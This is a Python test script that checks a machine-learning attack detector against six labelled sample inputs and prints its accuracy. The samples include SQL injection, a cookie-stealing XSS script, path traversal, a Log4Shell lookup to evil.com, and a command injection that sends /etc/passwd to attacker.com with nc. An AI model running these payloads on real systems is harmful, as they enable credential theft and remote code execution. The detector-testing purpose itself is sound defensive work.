import sys
sys.path.insert(0, ".")

# bypass app/__init__.py
import importlib, types
sys.modules['app'] = types.ModuleType('app')
sys.modules['app.database'] = types.ModuleType('app.database')

from app.ml.inference import ml_analyze, get_ml_stats

tests = [
    ("SELECT * FROM users WHERE id=1 OR 1=1", "sql_injection"),
    ("<script>alert(document.cookie)</script>", "xss"),
    ("../../../etc/passwd", "path_traversal"),
    ("hello how are you today", "normal"),
    ("${jndi:ldap://evil.com/x}", "log4shell"),
    ("ls; cat /etc/passwd | nc attacker.com 4444", "command_injection"),
]

print("Testing model...")
print("-" * 60)
ok = 0
for text, expected in tests:
    r = ml_analyze(text)
    status = "OK" if r.attack_type == expected else "FAIL"
    if r.attack_type == expected:
        ok += 1
    print(f"[{status}] {expected:<20} -> {r.attack_type:<20} ({r.risk_score*100:.0f}%)")

print("-" * 60)
print(f"Result: {ok}/{len(tests)} correct")

stats = get_ml_stats()
print(f"Model version : {stats['model_version']}")
print(f"Using v2      : {stats['using_v2']}")
print(f"Accuracy      : {stats['eval_metrics'].get('test_accuracy', 'N/A')}")
print(f"F1 macro      : {stats['eval_metrics'].get('f1_macro', 'N/A')}")